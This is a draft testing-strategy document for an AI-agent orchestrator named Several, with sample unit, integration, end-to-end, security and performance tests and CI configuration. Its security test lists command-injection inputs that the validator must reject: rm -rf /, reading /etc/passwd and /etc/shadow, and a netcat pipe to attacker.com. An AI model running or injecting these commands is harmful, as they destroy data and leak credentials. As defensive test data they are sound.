      # Testing Strategy

## Several: Universal AI Agent Orchestrator

**Version:** 1.0.0  
**Date:** 2026-02-21  
**Status:** Draft  

---

## 1. Overview

This document defines the comprehensive testing strategy for Several, covering unit tests, integration tests, end-to-end tests, and quality assurance processes. The goal is to ensure reliability, security, and correctness across all supported platforms and agent types.

---

## 2. Testing Pyramid

```
                    ┌─────────┐
                    │   E2E   │  ← 10%: Full workflow tests
                    │  Tests  │     (Real agents, real TUI)
                    ├─────────┤
                    │Integration│ ← 20%: Component interaction
                    │  Tests  │     (Mock agents, real orchestrator)
                    ├─────────┤
                    │  Unit   │  ← 70%: Individual functions
                    │  Tests  │     (Isolated, fast, deterministic)
                    └─────────┘
```

---

## 3. Test Categories

### 3.1 Unit Tests (70%)

**Scope:** Individual functions, classes, and modules in isolation.

| Module | Test File | Coverage Target |
|--------|-----------|-----------------|
| `TaskOrchestrator` | `test_orchestrator.py` | 90% |
| `AgentManager` | `test_agent_manager.py` | 90% |
| `StreamParser` | `test_parser.py` | 95% |
| `ProcessWrapper` | `test_process.py` | 85% |
| `ConfigValidator` | `test_config.py` | 95% |
| `Security` | `test_security.py` | 95% |
| `TUI Components` | `test_tui/` | 80% |

**Example Unit Test:**

```python
# tests/unit/test_parser.py
import pytest
from several.adapters.parser import StreamParser

class TestStreamParser:
    """Test output parsing from various agents."""
    
    @pytest.fixture
    def claude_parser(self):
        return StreamParser("claude")
    
    def test_parse_progress(self, claude_parser):
        """Test progress percentage extraction."""
        events = claude_parser.feed("Progress: 45%")
        assert len(events) == 1
        assert events[0].type == "progress"
        assert events[0].percent == 45
    
    def test_parse_tokens(self, claude_parser):
        """Test token usage extraction."""
        events = claude_parser.feed("Tokens used: 2,400 / 100,000")
        assert events[0].type == "tokens"
        assert events[0].used == 2400
        assert events[0].total == 100000
    
    def test_parse_tool_call(self, claude_parser):
        """Test tool call detection."""
        chunk = "▶ read_file({'path': 'src/main.py'})"
        events = claude_parser.feed(chunk)
        assert events[0].type == "tool_call"
        assert events[0].tool == "read_file"
    
    def test_partial_buffer(self, claude_parser):
        """Test handling of incomplete chunks."""
        claude_parser.feed("Progress: ")
        events = claude_parser.feed("67%")
        assert events[0].percent == 67
    
    @pytest.mark.parametrize("input_text,expected_type", [
        ("✓ Complete", "completion"),
        ("Error: timeout", "error"),
        ("Tokens: 100/1000", "tokens"),
    ])
    def test_mixed_output(self, claude_parser, input_text, expected_type):
        """Test parsing various output patterns."""
        events = claude_parser.feed(input_text)
        assert events[0].type == expected_type
```

### 3.2 Integration Tests (20%)

**Scope:** Interaction between components with mocked external dependencies.

| Test Suite | Description | Mock Strategy |
|------------|-------------|---------------|
| `test_orchestration.py` | Task scheduling, parallel execution | Mock agent processes |
| `test_workspace.py` | Git worktree creation, isolation | Temporary directories |
| `test_database.py` | SQLite operations, migrations | In-memory DB |
| `test_event_bus.py` | Event publishing/subscription | Async mocks |
| `test_security.py` | Input validation, sanitization | Fuzzing inputs |

**Example Integration Test:**

```python
# tests/integration/test_orchestration.py
import pytest
import asyncio
from several.core.orchestrator import TaskOrchestrator
from several.core.agent_manager import AgentManager

class TestTaskOrchestration:
    """Test task execution with mocked agents."""
    
    @pytest.fixture
    async def orchestrator(self, tmp_path):
        config = Config(data_dir=tmp_path)
        agent_manager = AgentManager(config)
        
        # Register mock agents
        for name in ["mock-claude", "mock-codex"]:
            agent_manager.registry.register(MockAgent(name))
        
        return TaskOrchestrator(config, agent_manager)
    
    @pytest.mark.asyncio
    async def test_parallel_execution(self, orchestrator):
        """Test that tasks run in parallel."""
        task = Task(
            prompt="Test prompt",
            agents=["mock-claude", "mock-codex"],
            mode=ExecutionMode.PARALLEL
        )
        
        start_time = asyncio.get_event_loop().time()
        results = await orchestrator.submit_task(task)
        duration = asyncio.get_event_loop().time() - start_time
        
        # Both agents should complete (each takes 0.1s mock delay)
        # Parallel execution should take ~0.1s, not 0.2s
        assert duration < 0.15
        assert len(results.agent_results) == 2
        assert all(r.status == AgentStatus.COMPLETED for r in results.agent_results)
    
    @pytest.mark.asyncio
    async def test_sequential_execution(self, orchestrator):
        """Test that tasks chain output in sequential mode."""
        task = Task(
            prompt="Step 1",
            agents=["mock-claude", "mock-codex"],
            mode=ExecutionMode.SEQUENTIAL
        )
        
        results = await orchestrator.submit_task(task)
        
        # Second agent should receive output from first
        assert "processed-by-claude" in results.agent_results[1].output
    
    @pytest.mark.asyncio
    async def test_agent_failure_handling(self, orchestrator):
        """Test graceful handling of agent crashes."""
        # Configure one agent to fail
        orchestrator.agent_manager.registry.get("mock-claude").should_fail = True
        
        task = Task(prompt="Test", agents=["mock-claude", "mock-codex"])
        results = await orchestrator.submit_task(task)
        
        assert results.agent_results[0].status == AgentStatus.ERROR
        assert results.agent_results[1].status == AgentStatus.COMPLETED
        assert results.success is False  # Partial success
```

### 3.3 End-to-End Tests (10%)

**Scope:** Full application testing with real dependencies in controlled environments.

| Test Suite | Environment | Requirements |
|------------|-------------|--------------|
| `test_e2e_tui.py` | Headless terminal | Textual test harness |
| `test_e2e_agents.py` | Docker containers | Real agent CLIs in containers |
| `test_e2e_workflow.py` | Full system | Complete user workflows |

**Example E2E Test:**

```python
# tests/e2e/test_e2e_tui.py
import pytest
from textual.pilot import Pilot
from several.tui.app import SeveralApp

class TestTUI:
    """Test TUI interactions."""
    
    @pytest.fixture
    async def app(self):
        app = SeveralApp(config=TestConfig())
        async with app.run_test() as pilot:
            yield pilot
    
    @pytest.mark.asyncio
    async def test_dashboard_render(self, app: Pilot):
        """Test initial dashboard render."""
        # Check header is present
        assert "Several" in app.screen.query_one("#header").render()
        
        # Check agent panes are created
        panes = app.screen.query(".agent-pane")
        assert len(panes) >= 1  # At least mock agent
    
    @pytest.mark.asyncio
    async def test_task_submission(self, app: Pilot):
        """Test submitting a task via TUI."""
        # Type in input
        await app.click("#task-input")
        await app.type("Test task submission")
        
        # Submit
        await app.press("enter")
        
        # Wait for processing
        await app.pause(0.5)
        
        # Check progress bars appeared
        progress_bars = app.screen.query(".progress-bar")
        assert len(progress_bars) > 0
    
    @pytest.mark.asyncio
    async def test_keyboard_navigation(self, app: Pilot):
        """Test vim-style keybindings."""
        # Press '?' for help
        await app.press("?")
        assert app.screen.query_one("#help-modal").display is True
        
        # Press 'q' to close
        await app.press("q")
        assert "#help-modal" not in app.screen.query()
```

---

## 4. Test Infrastructure

### 4.1 Test Fixtures & Factories

```python
# tests/conftest.py
import pytest
import tempfile
import shutil
from pathlib import Path

@pytest.fixture
def temp_several_home():
    """Create temporary Several home directory."""
    tmp = tempfile.mkdtemp(prefix="several-test-")
    yield Path(tmp)
    shutil.rmtree(tmp, ignore_errors=True)

@pytest.fixture
def mock_agent():
    """Create mock agent for testing."""
    return MockAgent(
        id="mock-agent",
        name="Mock Agent",
        delay=0.01,  # Fast for tests
        output="Mock output"
    )

@pytest.fixture
def sample_task():
    """Create sample task."""
    return Task(
        id="test-task-123",
        prompt="Test prompt",
        agents=["mock-agent"],
        mode=ExecutionMode.PARALLEL
    )

@pytest.fixture
def event_bus():
    """Create fresh event bus."""
    return EventBus()

class MockAgent:
    """Configurable mock agent for testing."""
    
    def __init__(self, id, name, delay=0.01, output="Mock output", should_fail=False):
        self.id = id
        self.name = name
        self.delay = delay
        self.output = output
        self.should_fail = should_fail
    
    async def execute(self, task):
        await asyncio.sleep(self.delay)
        if self.should_fail:
            raise AgentError("Mock failure")
        return AgentResult(
            agent_id=self.id,
            status=AgentStatus.COMPLETED,
            output=self.output
        )
```

### 4.2 Test Configuration

```ini
# pytest.ini
[pytest]
testpaths = tests
python_files = test_*.py
python_classes = Test*
python_functions = test_*

addopts = 
    -v
    --tb=short
    --strict-markers
    --cov=several
    --cov-report=term-missing
    --cov-report=html:htmlcov
    --cov-fail-under=80

markers =
    unit: Unit tests (fast, isolated)
    integration: Integration tests (slower, with mocks)
    e2e: End-to-end tests (slowest, full system)
    slow: Tests that take >1s
    security: Security-focused tests
    flaky: Known flaky tests (retry)

filterwarnings =
    ignore::DeprecationWarning
    ignore::PendingDeprecationWarning
```

### 4.3 CI/CD Test Matrix

```yaml
# .github/workflows/test.yml
name: Tests

on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ['3.9', '3.10', '3.11', '3.12']
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
      
      - name: Install dependencies
        run: |
          pip install -e ".[dev]"
      
      - name: Run unit tests
        run: |
          pytest -m unit --cov=several --cov-report=xml
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          file: ./coverage.xml

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: pip install -e ".[dev]"
      
      - name: Run integration tests
        run: pytest -m integration -v

  e2e-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      
      - name: Install Several
        run: pip install -e .
      
      - name: Install test agents (mock CLIs)
        run: |
          # Install mock agent scripts to PATH
          echo "$PWD/tests/e2e/mock-agents" >> $GITHUB_PATH
      
      - name: Run E2E tests
        run: pytest -m e2e -v --timeout=300

  platform-tests:
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
    
    runs-on: ${{ matrix.os }}
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      
      - name: Install
        run: pip install -e .
      
      - name: Smoke test
        run: |
          several --version
          several --help
          several agents list
```

---

## 5. Specialized Testing

### 5.1 Security Testing

```python
# tests/security/test_security.py
import pytest
from several.security.validator import AgentConfigValidator
from several.security.sanitizer import OutputSanitizer

class TestSecurity:
    """Security-focused tests."""
    
    @pytest.mark.parametrize("malicious_input", [
        "; rm -rf /",
        "$(cat /etc/passwd)",
        "`whoami`",
        "| nc attacker.com 9999",
        "${IFS}cat${IFS}/etc/shadow",
    ])
    def test_command_injection_prevention(self, malicious_input):
        """Test that malicious inputs are rejected."""
        validator = AgentConfigValidator()
        
        config = {
            "command": {
                "binary": "/bin/echo",
                "args": [malicious_input]
            }
        }
        
        result = validator.validate(config)
        assert not result.valid
        assert any("forbidden" in e.lower() for e in result.errors)
    
    def test_ansi_escape_sanitization(self):
        """Test dangerous ANSI sequences are stripped."""
        sanitizer = OutputSanitizer()
        
        dangerous = "\x1b[31m\x1b[2J\x1b[?47h"  # Clear screen, alternate buffer
        clean = sanitizer.sanitize_for_display(dangerous)
        
        assert "\x1b[2J" not in clean  # Clear screen removed
        assert "\x1b[31m" not in clean or "[SAFE_RED]" in clean  # Or replaced
    
    def test_secret_scrubbing(self):
        """Test API keys are redacted from logs."""
        sanitizer = OutputSanitizer()
        
        output = "Error: sk-abcdefghijklmnopqrstuvwxyz123456789ABCDEF"
        scrubbed = sanitizer.sanitize_for_logs(output)
        
        assert "sk-" not in scrubbed
        assert "[OPENAI_KEY_REDACTED]" in scrubbed
    
    @pytest.mark.fuzz
    def test_fuzz_input_parsing(self):
        """Fuzz test input parsing with random data."""
        import random
        import string
        
        parser = StreamParser("claude")
        
        for _ in range(1000):
            random_input = ''.join(random.choices(
                string.printable, 
                k=random.randint(1, 1000)
            ))
            
            # Should not crash
            events = parser.feed(random_input)
            assert isinstance(events, list)
```

### 5.2 Performance Testing

```python
# tests/performance/test_performance.py
import pytest
import time
import asyncio
from several.core.orchestrator import TaskOrchestrator

class TestPerformance:
    """Performance benchmarks."""
    
    @pytest.mark.benchmark
    def test_orchestrator_startup_time(self):
        """Ensure startup is under 2 seconds."""
        start = time.time()
        orchestrator = create_test_orchestrator()
        elapsed = time.time() - start
        
        assert elapsed < 2.0, f"Startup took {elapsed}s"
    
    @pytest.mark.benchmark
    @pytest.mark.asyncio
    async def test_parallel_agent_scaling(self):
        """Test scaling with many agents."""
        orchestrator = create_test_orchestrator()
        
        # Test with 1, 2, 4, 8 agents
        for num_agents in [1, 2, 4, 8]:
            agents = [f"mock-agent-{i}" for i in range(num_agents)]
            task = Task(prompt="Test", agents=agents)
            
            start = time.time()
            await orchestrator.submit_task(task)
            elapsed = time.time() - start
            
            # Should scale sub-linearly (parallelism)
            # 8 agents should take < 2x time of 1 agent
            if num_agents == 1:
                baseline = elapsed
            else:
                assert elapsed < baseline * 2, f"{num_agents} agents took {elapsed}s"
    
    @pytest.mark.benchmark
    def test_memory_usage(self):
        """Test memory doesn't grow unbounded."""
        import tracemalloc
        
        tracemalloc.start()
        
        # Run 100 tasks
        for _ in range(100):
            orchestrator = create_test_orchestrator()
            # ... run task ...
        
        current, peak = tracemalloc.get_traced_memory()
        tracemalloc.stop()
        
        # Peak should be under 100MB
        assert peak < 100 * 1024 * 1024, f"Peak memory: {peak / 1024 / 1024}MB"
```

### 5.3 Concurrency Testing

```python
# tests/concurrency/test_concurrency.py
import pytest
import asyncio
from several.core.event_bus import EventBus

class TestConcurrency:
    """Test async behavior and race conditions."""
    
    @pytest.mark.asyncio
    async def test_event_bus_thread_safety(self):
        """Test event bus handles concurrent publishers."""
        bus = EventBus()
        received = []
        
        async def subscriber(event):
            received.append(event)
        
        bus.subscribe("test", subscriber)
        
        # 100 concurrent publishers
        await asyncio.gather(*[
            bus.publish(Event(type="test", data=i))
            for i in range(100)
        ])
        
        await asyncio.sleep(0.1)  # Let dispatch complete
        assert len(received) == 100
    
    @pytest.mark.asyncio
    async def test_graceful_shutdown(self):
        """Test clean shutdown with running agents."""
        orchestrator = create_test_orchestrator()
        
        # Start long-running task
        task = Task(prompt="Long task", agents=["slow-agent"])
        task_future = asyncio.create_task(
            orchestrator.submit_task(task)
        )
        
        # Give it time to start
        await asyncio.sleep(0.1)
        
        # Initiate shutdown
        shutdown_task = asyncio.create_task(orchestrator.shutdown())
        
        # Should complete within timeout
        done, pending = await asyncio.wait(
            [shutdown_task],
            timeout=5.0
        )
        
        assert len(done) == 1
        assert orchestrator.is_shutdown
```

---

## 6. Quality Assurance

### 6.1 Code Quality Tools

| Tool | Purpose | Configuration |
|------|---------|---------------|
| **pytest** | Test runner | `pytest.ini` |
| **coverage** | Code coverage | Min 80% threshold |
| **black** | Code formatting | Line length 100 |
| **ruff** | Fast linting | `pyproject.toml` |
| **mypy** | Type checking | Strict mode |
| **bandit** | Security linting | `bandit.yaml` |
| **safety** | Dependency vulnerabilities | CI check |

### 6.2 Pre-commit Hooks

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: trailing-whitespace
      - id: end-of-file-fixer
      - id: check-yaml
      - id: check-added-large-files

  - repo: https://github.com/psf/black
    rev: 23.12.1
    hooks:
      - id: black
        language_version: python3.11

  - repo: https://github.com/charliermarsh/ruff-pre-commit
    rev: v0.1.9
    hooks:
      - id: ruff
        args: [--fix, --exit-non-zero-on-fix]

  - repo: https://github.com/pre-commit/mirrors-mypy
    rev: v1.7.1
    hooks:
      - id: mypy
        additional_dependencies: [types-PyYAML, types-requests]

  - repo: local
    hooks:
      - id: pytest-check
        name: pytest-check
        entry: pytest -x -q
        language: system
        pass_filenames: false
        always_run: true
```

### 6.3 Test Data Management

```
tests/
├── fixtures/
│   ├── agent_outputs/
│   │   ├── claude-sample-output.txt
│   │   ├── codex-sample-output.txt
│   │   └── gemini-sample-output.txt
│   ├── configs/
│   │   ├── valid-agent.yaml
│   │   ├── invalid-agent.yaml
│   │   └── malicious-agent.yaml
│   └── projects/
│       ├── sample-python-project/
│       └── sample-js-project/
├── mock-agents/
│   ├── mock-claude
│   ├── mock-codex
│   └── mock-gemini
└── utils/
    └── helpers.py
```

---

## 7. Release Testing

### 7.1 Release Checklist

Before each release:

- [ ] All unit tests pass
- [ ] All integration tests pass
- [ ] E2E tests pass on all platforms
- [ ] Security tests pass
- [ ] Performance benchmarks within 10% of baseline
- [ ] Code coverage ≥ 80%
- [ ] No high/critical vulnerabilities in dependencies
- [ ] Manual smoke test on clean VM
- [ ] Documentation updated
- [ ] CHANGELOG.md updated

### 7.2 Beta Testing Program

| Phase | Duration | Testers | Focus |
|-------|----------|---------|-------|
| Alpha | 1 week | Core team | Basic functionality |
| Beta | 2 weeks | 10 volunteers | Real-world usage |
| RC | 1 week | 50 volunteers | Polish, edge cases |
| GA | - | Public | Production use |

---

## 8. Test Documentation

### 8.1 Test Naming Convention

```
test_<module>_<scenario>_<expected_result>

Examples:
test_orchestrator_parallelExecution_completesAllAgents
test_parser_claudeOutput_extractsProgressCorrectly
test_security_maliciousInput_rejectsWithError
```

### 8.2 Test Documentation Template

```python
def test_feature_description(self):
    """
    Test that [feature] behaves correctly when [condition].
    
    Setup:
        - State 1
        - State 2
    
    Action:
        - Perform action
    
    Expected:
        - Result 1
        - Result 2
    
    Related: Issue #123, PR #456
    """
    pass
```

---
